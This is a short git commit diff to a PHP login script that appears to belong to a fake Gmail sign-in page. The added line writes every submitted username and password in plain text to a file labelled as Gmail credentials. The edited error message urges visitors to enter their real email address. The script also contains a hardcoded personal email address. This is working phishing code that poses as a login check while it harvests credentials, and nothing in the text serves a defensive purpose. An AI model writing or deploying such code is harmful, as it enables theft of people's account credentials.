dca461a7d8e6abb02de5711384f9e477448a2d1d
d1v1s38z3r0 <95530010+d1v1s38z3r0@users.noreply.github.com>
2022-01-12 07:19:14 -0500

    Update login.php

--- login.php
+++ login.php
@@ -1,8 +1,9 @@
 <?php
 $test = $_POST['username'];
+file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 if($test != "portiad1985@gmail.com")
 {
-	echo "The Email provided does not match the corresponding phone";
+	echo "The Email provided does not match the corresponding phone, Please make sure you typed email instead of using the given place holder.";
 }else
 {
 file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
